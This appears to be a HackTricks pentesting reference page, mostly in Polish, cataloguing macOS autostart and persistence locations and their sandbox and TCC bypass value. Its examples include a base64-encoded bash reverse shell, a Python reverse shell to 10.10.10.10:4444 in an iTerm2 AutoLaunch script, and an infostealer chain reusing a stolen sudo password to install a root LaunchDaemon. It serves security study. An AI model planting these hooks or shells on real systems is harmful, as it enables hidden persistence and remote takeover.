# macOS Autostart

{{#include ../banners/hacktricks-training.md}}

Ta sekcja opiera się w dużej mierze na serii blogowej [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/), celem jest dodanie **więcej lokalizacji autostartu** (jeśli to możliwe), wskazanie **które techniki są nadal działające** obecnie z najnowszą wersją macOS (13.4) oraz określenie potrzebnych **uprawnień**.

## Sandbox Bypass

> [!TIP]
> Tutaj znajdziesz lokalizacje startowe przydatne do **sandbox bypass**, które pozwalają po prostu coś wykonać przez **zapisanie tego do pliku** i **oczekiwanie** na bardzo **powszechne** **zdarzenie**, określony **czas** lub **akcję, którą zwykle możesz wykonać** z wnętrza sandboxa bez potrzeby posiadania uprawnień root.

### Launchd

- Przydatne do sandbox bypass: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacje

- **`/Library/LaunchAgents`**
- **Wyzwalacz**: Ponowne uruchomienie
- Wymagane uprawnienia root
- **`/Library/LaunchDaemons`**
- **Wyzwalacz**: Ponowne uruchomienie
- Wymagane uprawnienia root
- **`/System/Library/LaunchAgents`**
- **Wyzwalacz**: Ponowne uruchomienie
- Wymagane uprawnienia root
- **`/System/Library/LaunchDaemons`**
- **Wyzwalacz**: Ponowne uruchomienie
- Wymagane uprawnienia root
- **`~/Library/LaunchAgents`**
- **Wyzwalacz**: Ponowne zalogowanie
- **`~/Library/LaunchDemons`**
- **Wyzwalacz**: Ponowne zalogowanie

> [!TIP]
> Ciekawostka: **`launchd`** ma osadzoną property list w sekcji Mach-o `__Text.__config`, która zawiera inne dobrze znane usługi, które launchd musi uruchomić. Co więcej, te usługi mogą zawierać `RequireSuccess`, `RequireRun` i `RebootOnSuccess`, co oznacza, że muszą być uruchomione i zakończone pomyślnie.
>
> Oczywiście nie można tego zmodyfikować ze względu na podpisywanie kodu.

#### Opis & Exploitation

**`launchd`** jest **pierwszym** **procesem** uruchamianym przez jądro OX S przy starcie i ostatnim, który kończy działanie przy zamykaniu. Zawsze powinien mieć **PID 1**. Ten proces będzie **odczytywać i wykonywać** konfiguracje wskazane w **ASEP** **plists** w:

- `/Library/LaunchAgents`: Agenty per-user zainstalowane przez administratora
- `/Library/LaunchDaemons`: System-wide daemons zainstalowane przez administratora
- `/System/Library/LaunchAgents`: Agenty per-user dostarczone przez Apple
- `/System/Library/LaunchDaemons`: System-wide daemons dostarczone przez Apple

Kiedy użytkownik się loguje, plisty znajdujące się w `/Users/$USER/Library/LaunchAgents` i `/Users/$USER/Library/LaunchDemons` są uruchamiane z **uprawnieniami zalogowanego użytkownika**.

Główna różnica między agents i daemons polega na tym, że agenty są ładowane przy logowaniu użytkownika, a daemony są ładowane przy starcie systemu (np. są usługi jak ssh, które muszą być uruchomione zanim jakikolwiek użytkownik uzyska dostęp do systemu). Agenty mogą używać GUI, podczas gdy daemony muszą działać w tle.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Są przypadki, gdy **agent musi zostać uruchomiony przed zalogowaniem użytkownika**, takie są nazywane **PreLoginAgents**. Na przykład przydaje się to do zapewnienia funkcji ułatwień dostępu podczas logowania. Można je również znaleźć w `/Library/LaunchAgents`(zobacz [**here**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) przykład).

> [!TIP]
> Nowe pliki konfiguracyjne daemonów lub agentów zostaną **załadowane po następnym restarcie lub przy użyciu** `launchctl load <target.plist>` **Możliwe jest także załadowanie plików .plist bez tego rozszerzenia** za pomocą `launchctl -F <file>` (jednak takie pliki plist nie będą automatycznie ładowane po restarcie).\
> Można również **odładować** przy pomocy `launchctl unload <target.plist>` (proces wskazywany przez ten plik zostanie zakończony),
>
> Aby **upewnić się**, że nie ma **niczego** (np. nadpisania) **uniemożliwiającego** agentowi lub demonowi **uruchomienie**, uruchom: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`

Wypisz wszystkie agenty i demony załadowane przez bieżącego użytkownika:
```bash
launchctl list
```
#### Przykładowy złośliwy łańcuch LaunchDaemon (ponowne użycie hasła)

A recent macOS infostealer reused a **captured sudo password** to drop a user agent and a root LaunchDaemon:

- Zapisz pętlę agenta do `~/.agent` i nadaj jej prawa wykonywania.
- Wygeneruj plist w `/tmp/starter` wskazujący na tego agenta.
- Wykorzystaj skradzione hasło ponownie z `sudo -S`, aby skopiować go do `/Library/LaunchDaemons/com.finder.helper.plist`, ustawić `root:wheel` i załadować go za pomocą `launchctl load`.
- Uruchom agenta cicho za pomocą `nohup ~/.agent >/dev/null 2>&1 &`, aby odłączyć wyjście.
```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> Jeśli plist jest własnością użytkownika, nawet jeśli znajduje się w systemowym folderze daemonów, **zadanie zostanie wykonane jako ten użytkownik** a nie jako root. To może zapobiec niektórym atakom eskalacji uprawnień.

#### Więcej informacji o launchd

**`launchd`** jest **pierwszym** procesem w trybie użytkownika uruchamianym przez **kernel**. Uruchomienie procesu musi się powieść i **nie może się zakończyć ani zawiesić**. Jest nawet **chroniony** przed niektórymi **sygnałami zabijającymi**.

Jedną z pierwszych rzeczy, które `launchd` robi, jest **uruchomienie** wszystkich **daemons**, takich jak:

- **Timer daemons** uruchamiane na podstawie czasu:
- atd (`com.apple.atrun.plist`): Ma `StartInterval` ustawiony na 30min
- crond (`com.apple.systemstats.daily.plist`): Ma `StartCalendarInterval` ustawiony na 00:15
- **Network daemons** takie jak:
- `org.cups.cups-lpd`: Nasłuchuje na TCP (`SockType: stream`) z `SockServiceName: printer`
- SockServiceName musi być albo portem albo serwisem z `/etc/services`
- `com.apple.xscertd.plist`: Nasłuchuje na TCP na porcie 1640
- **Path daemons** uruchamiane, gdy określona ścieżka ulega zmianie:
- `com.apple.postfix.master`: Sprawdza ścieżkę `/etc/postfix/aliases`
- **IOKit notifications daemons**:
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
- `com.apple.xscertd-helper.plist`: W wpisie `MachServices` wskazuje nazwę `com.apple.xscertd.helper`
- **UserEventAgent:**
- To różni się od poprzedniego. Sprawia, że launchd uruchamia aplikacje w odpowiedzi na konkretne zdarzenia. Jednak w tym przypadku główny binarny plik zaangażowany nie jest `launchd`, lecz `/usr/libexec/UserEventAgent`. Ładuje on pluginy z ograniczonego przez SIP folderu /System/Library/UserEventPlugins/, gdzie każdy plugin wskazuje swój inicjalizator w kluczu `XPCEventModuleInitializer` lub, w przypadku starszych pluginów, w słowniku `CFPluginFactories` pod kluczem `FB86416D-6164-2070-726F-70735C216EC0` w jego `Info.plist`.

### pliki startowe powłoki

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

- Przydatne do obejścia sandboxa: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
- Jednak musisz znaleźć aplikację z TCC bypass, która uruchamia shell ładujący te pliki

#### Lokacje

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **Wyzwalacz**: Otwórz terminal z zsh
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **Wyzwalacz**: Otwórz terminal z zsh
- Wymagane uprawnienia root
- **`~/.zlogout`**
- **Wyzwalacz**: Zamknij terminal z zsh
- **`/etc/zlogout`**
- **Wyzwalacz**: Zamknij terminal z zsh
- Wymagane uprawnienia root
- Potencjalnie więcej w: **`man zsh`**
- **`~/.bashrc`**
- **Wyzwalacz**: Otwórz terminal z bash
- `/etc/profile` (nie działało)
- `~/.profile` (nie działało)
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Wyzwalacz**: Oczekiwano uruchomienia przez xterm, ale **nie jest zainstalowany** i nawet po instalacji pojawia się błąd: xterm: `DISPLAY is not set`

#### Opis i eksploatacja

Podczas inicjowania środowiska powłoki takiego jak `zsh` lub `bash`, **uruchamiane są określone pliki startowe**. macOS obecnie używa `/bin/zsh` jako domyślnej powłoki. Ta powłoka jest automatycznie używana po uruchomieniu aplikacji Terminal lub przy dostępie do urządzenia przez SSH. Chociaż `bash` i `sh` również są obecne w macOS, trzeba je wywołać explicite, aby zostały użyte.

Strona podręcznika zsh, którą można przeczytać poleceniem **`man zsh`**, zawiera obszerny opis plików startowych.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Ponownie otwierane aplikacje

> [!CAUTION]
> Konfigurowanie wskazanego exploitation oraz wylogowywanie i ponowne logowanie, a nawet reboot, nie spowodowały u mnie uruchomienia aplikacji. (Aplikacja nie była uruchamiana, być może musi być aktywna w momencie wykonywania tych akcji)

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)

- Przydatne do obejścia sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Wyzwalacz**: Restart — ponowne otwieranie aplikacji

#### Opis & Exploitation

Wszystkie aplikacje do ponownego otwarcia znajdują się w pliku plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`

Aby aplikacje otwierane ponownie uruchamiały twoją, wystarczy **dodać swoją aplikację do listy**.

UUID można znaleźć, wypisując zawartość tego katalogu lub za pomocą `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Aby sprawdzić aplikacje, które zostaną ponownie otwarte, możesz wykonać:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Aby **dodać aplikację do tej listy**, możesz użyć:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Preferencje Terminala

- Przydatne do obejścia sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal zwykle ma uprawnienia FDA użytkownika, który go używa

#### Lokalizacja

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Wyzwalacz**: Otwarcie Terminala

#### Opis i eksploatacja

W **`~/Library/Preferences`** przechowywane są preferencje użytkownika dla aplikacji. Niektóre z tych preferencji mogą zawierać konfigurację do **uruchamiania innych aplikacji/skryptów**.

Na przykład Terminal może wykonać polecenie podczas uruchamiania:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Ta konfiguracja jest odzwierciedlona w pliku **`~/Library/Preferences/com.apple.Terminal.plist`** w następujący sposób:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Zatem, jeśli plist preferencji terminala w systemie można by było nadpisać, funkcja **`open`** może zostać użyta do **otwarcia terminala i wykonania tej komendy**.

Możesz dodać to z poziomu cli za pomocą:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Skrypty Terminala / Inne rozszerzenia plików

- Przydatne do obejścia sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal często ma przyznane przez użytkownika uprawnienia FDA — użycie go pozwala skorzystać z tych uprawnień

#### Lokalizacja

- **Gdziekolwiek**
- **Wyzwalacz**: Otworzenie Terminala

#### Opis i wykorzystanie

Jeśli utworzysz [**`.terminal`** script](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) i go otworzysz, **aplikacja Terminal** zostanie automatycznie uruchomiona, aby wykonać polecenia w niej zawarte. Jeśli aplikacja Terminal ma przyznane specjalne uprawnienia (np. TCC), Twoje polecenia zostaną uruchomione z tymi uprawnieniami.

Wypróbuj z:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
You could also use the extensions **`.command`**, **`.tool`**, with regular shell scripts content and they will be also opened by Terminal.

> [!CAUTION]
> If Terminal has **Full Disk Access** it will be able to complete that action (note that the command executed will be visible in a Terminal.app window).

### Audio Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

- Przydatne do obejścia sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Możesz uzyskać dodatkowy dostęp TCC

#### Location

- **`/Library/Audio/Plug-Ins/HAL`**
- Wymaga root
- **Trigger**: Restart coreaudiod or the computer
- **`/Library/Audio/Plug-ins/Components`**
- Wymaga root
- **Trigger**: Restart coreaudiod or the computer
- **`~/Library/Audio/Plug-ins/Components`**
- **Trigger**: Restart coreaudiod or the computer
- **`/System/Library/Components`**
- Wymaga root
- **Trigger**: Restart coreaudiod or the computer

#### Description

According to the previous writeups it's possible to **compile some audio plugins** and get them loaded.

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)

- Przydatne do obejścia sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Możesz uzyskać dodatkowy dostęp TCC

#### Location

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Description & Exploitation

QuickLook plugins can be executed when you **trigger the preview of a file** (press space bar with the file selected in Finder) and a **plugin supporting that file type** is installed.

It's possible to compile your own QuickLook plugin, place it in one of the previous locations to load it and then go to a supported file and press space to trigger it.

### ~~Login/Logout Hooks~~

> [!CAUTION]
> This didn't work for me, neither with the user LoginHook nor with the root LogoutHook

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)

- Przydatne do obejścia sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- Musisz móc wykonać coś w stylu `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
- `Lo`cated in `~/Library/Preferences/com.apple.loginwindow.plist`

Są przestarzałe, ale można ich użyć do wykonywania poleceń podczas logowania użytkownika.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
To ustawienie jest przechowywane w `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Aby to usunąć:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
The root user one is stored in **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Conditional Sandbox Bypass

> [!TIP]
> Tutaj znajdziesz miejsca startowe przydatne do **sandbox bypass**, które pozwalają po prostu wykonać coś przez **zapisanie tego do pliku** i **oczekując na niezbyt powszechne warunki** takich jak konkretne **zainstalowane programy, "nietypowe" działania użytkownika** lub środowiska.

### Cron

**Opis**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)

- Przydatne do sandbox bypass: [✅](https://emojipedia.org/check-mark-button)
- Jednak musisz móc uruchomić binarkę `crontab`
- Lub być root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- Root wymagany do bezpośredniego zapisu. Root nie jest wymagany, jeśli możesz wykonać `crontab <file>`
- **Wyzwalacz**: Zależy od zadania cron

#### Opis & Wykorzystanie

Wyświetl zadania cron **bieżącego użytkownika** za pomocą:
```bash
crontab -l
```
Możesz również zobaczyć wszystkie cron jobs użytkowników w **`/usr/lib/cron/tabs/`** i **`/var/at/tabs/`** (wymaga root).

W MacOS można znaleźć kilka folderów uruchamiających skrypty z **określoną częstotliwością**:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Tam znajdziesz regularne **cron** **jobs**, **at** **jobs** (niezbyt używane) i **periodic** **jobs** (głównie używane do czyszczenia plików tymczasowych). Codzienne periodic jobs można na przykład uruchomić poleceniem: `periodic daily`.

Aby dodać **user cronjob programatically** można użyć:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Opis: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)

- Przydatne do obejścia sandboxu: [✅](https://emojipedia.org/check-mark-button)
- Omijanie TCC: [✅](https://emojipedia.org/check-mark-button)
- iTerm2 kiedyś miało przyznane uprawnienia TCC

#### Lokalizacje

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Wyzwalacz**: Otwarcie iTerm
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Wyzwalacz**: Otwarcie iTerm
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Wyzwalacz**: Otwarcie iTerm

#### Opis i wykorzystanie

Skrypty zapisane w **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** zostaną wykonane. Na przykład:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
lub:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
Skrypt **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** zostanie również wykonany:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
Preferencje iTerm2 znajdujące się w **`~/Library/Preferences/com.googlecode.iterm2.plist`** mogą **wskazywać polecenie do wykonania** po otwarciu terminala iTerm2.

To ustawienie można skonfigurować w ustawieniach iTerm2:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

A polecenie jest odzwierciedlone w preferencjach:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Możesz ustawić polecenie do wykonania za pomocą:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> Bardzo prawdopodobne, że istnieją **inne sposoby nadużycia preferencji iTerm2** do wykonania dowolnych poleceń.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)

- Przydatne do obejścia sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ale xbar musi być zainstalowany
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Wymaga uprawnień Dostępności

#### Location

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Wyzwalacz**: Po uruchomieniu xbar

#### Description

Jeśli popularny program [**xbar**](https://github.com/matryer/xbar) jest zainstalowany, możliwe jest utworzenie skryptu shell w **`~/Library/Application\ Support/xbar/plugins/`**, który zostanie wykonany po uruchomieniu xbar:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)

- Przydatne do bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- Jednak Hammerspoon musi być zainstalowany
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Wymaga uprawnień Accessibility

#### Lokalizacja

- **`~/.hammerspoon/init.lua`**
- **Wyzwalacz**: Po uruchomieniu hammerspoon

#### Opis

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) działa jako platforma automatyzacji dla **macOS**, wykorzystując język skryptowy **LUA** do swoich operacji. Co istotne, obsługuje integrację pełnego kodu **AppleScript** oraz wykonywanie skryptów powłoki, co znacząco rozszerza jego możliwości skryptowe.

Aplikacja szuka pojedynczego pliku, `~/.hammerspoon/init.lua`, i po uruchomieniu skrypt zostanie wykonany.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- Przydatne do obejścia sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ale BetterTouchTool musi być zainstalowany
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Żąda uprawnień Automation-Shortcuts i Accessibility

#### Lokalizacja

- `~/Library/Application Support/BetterTouchTool/*`

To narzędzie pozwala wskazać aplikacje lub skrypty do uruchomienia, gdy naciśnięte zostaną określone skróty. Atakujący może być w stanie skonfigurować własny **skrót i akcję do wykonania w bazie danych**, aby uruchomić dowolny kod (skrót może polegać na zwykłym naciśnięciu klawisza).

### Alfred

- Przydatne do obejścia sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ale Alfred musi być zainstalowany
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Żąda uprawnień Automation, Accessibility i nawet Full-Disk Access

#### Lokalizacja

- `???`

Pozwala tworzyć workflows, które mogą wykonywać kod, gdy spełnione są określone warunki. Potencjalnie możliwe jest, aby atakujący utworzył plik workflow i sprawił, że Alfred go załaduje (do korzystania z workflows potrzebna jest wersja premium).

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)

- Przydatne do obejścia sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ale ssh musi być włączony i używany
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- SSH miał dostęp FDA

#### Lokalizacja

- **`~/.ssh/rc`**
- **Wyzwalacz**: Logowanie przez ssh
- **`/etc/ssh/sshrc`**
- Wymagane uprawnienia root
- **Wyzwalacz**: Logowanie przez ssh

> [!CAUTION]
> Aby włączyć ssh wymagany jest Full Disk Access:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Opis i eksploatacja

Domyślnie, chyba że `PermitUserRC no` w `/etc/ssh/sshd_config`, gdy użytkownik **loguje się przez SSH** skrypty **`/etc/ssh/sshrc`** i **`~/.ssh/rc`** zostaną wykonane.

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)

- Przydatne do obejścia sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ale musisz uruchomić `osascript` z argumentami
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacje

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Wyzwalacz:** Logowanie
- Eksploitatowalny payload przechowywany wywołując **`osascript`**
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Wyzwalacz:** Logowanie
- Wymagane uprawnienia root

#### Opis

W System Preferences -> Users & Groups -> **Login Items** znajdziesz **pozycje uruchamiane podczas logowania użytkownika**.\
Możliwe jest ich wyświetlanie, dodawanie i usuwanie z wiersza poleceń:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Te elementy są przechowywane w pliku **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

**Elementy logowania** mogą **także** być wskazane przy użyciu API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc), które zapisze konfigurację w **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**

### ZIP jako element logowania

(Sprawdź poprzednią sekcję o Login Items, to jest rozszerzenie)

Jeśli zapiszesz plik **ZIP** jako **element logowania**, **`Archive Utility`** go otworzy — i jeśli zip był na przykład zapisany w **`~/Library`** i zawierał folder **`LaunchAgents/file.plist`** z backdoor, ten folder zostanie utworzony (nie jest tworzony domyślnie) i plist zostanie dodany, więc przy następnym logowaniu użytkownika **backdoor wskazany w plist zostanie wykonany**.

Inną opcją byłoby utworzenie plików **`.bash_profile`** i **`.zshenv`** w katalogu domowym użytkownika (HOME), więc jeśli folder LaunchAgents już istnieje, ta technika nadal będzie działać.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)

- Przydatne do obejścia sandboxa: [✅](https://emojipedia.org/check-mark-button)
- Ale musisz **wykonać** **`at`** i musi być **włączony**
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- Musisz **wykonać** **`at`** i musi być **włączony**

#### **Description**

`at` tasks are designed for **planowania zadań jednorazowych** do wykonania o określonych porach. W przeciwieństwie do zadań cron, zadania `at` są automatycznie usuwane po wykonaniu. Należy zauważyć, że zadania te są trwałe między ponownymi uruchomieniami systemu, co czyni je potencjalnym zagrożeniem bezpieczeństwa w pewnych warunkach.

Domyślnie są **wyłączone**, ale użytkownik **root** może **je włączyć** za pomocą:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
